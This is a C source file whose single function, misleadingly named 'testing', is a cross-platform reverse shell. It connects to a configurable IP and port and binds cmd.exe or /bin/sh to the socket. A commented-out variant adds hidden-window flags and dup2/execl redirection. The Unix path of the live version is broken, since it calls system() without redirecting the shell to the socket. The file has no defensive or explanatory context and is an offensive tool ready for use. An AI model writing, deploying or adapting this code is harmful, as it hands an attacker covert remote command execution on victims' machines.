#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

#include <stdio.h>
#include <string.h>

#ifdef _WIN32
    WSADATA wsaData;
    SOCKET winSock;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
#else
    int sockfd;
#endif

struct sockaddr_in sockAddr;

// Change these
int port = 4444;
char *ip = "127.0.0.1";

int testing(void) {
    printf("testing\n");

    #ifdef _WIN32
        WSAStartup(MAKEWORD(2,2), &wsaData);
        winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    #else
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
    #endif

    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(ip);

    #ifdef _WIN32
        WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = STARTF_USESTDHANDLES;
        sinfo.hStdError = (HANDLE)winSock;
        sinfo.hStdInput = (HANDLE)winSock;
        sinfo.hStdOutput = (HANDLE)winSock;
    
        CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    #else
        connect(sockfd, (struct sockaddr*)&sockAddr, sizeof(sockAddr));
        // For Unix-like systems, you might want to use fork() and exec() to run a shell
        // This is just a placeholder
        system("/bin/sh");
    #endif

    #ifdef _WIN32
        // Keep the shell running
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        
        // Clean up
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
        closesocket(winSock);
        WSACleanup();
    #else
        // Keep the shell running
        int status;
        wait(&status);
        
        // Clean up
        close(sockfd);
    #endif

    return 0;
}

/*
int testing(void) {
    printf("testing\n");

    #ifdef _WIN32
        WSAStartup(MAKEWORD(2,2), &wsaData);
        winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    #else
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
    #endif

    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(ip);

    #ifdef _WIN32
        WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);

        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)winSock;
        si.wShowWindow = SW_HIDE;

        char cmd[] = "cmd.exe";
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        // Optionally, close handles to avoid resource leaks
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    #else
        connect(sockfd, (struct sockaddr*)&sockAddr, sizeof(sockAddr));
        // For Unix-like systems, fork and exec to run a shell in the background
        if (fork() == 0) {
            dup2(sockfd, 0);
            dup2(sockfd, 1);
            dup2(sockfd, 2);
            execl("/bin/sh", "sh", NULL);
        }
    #endif

    return 0;
}
*/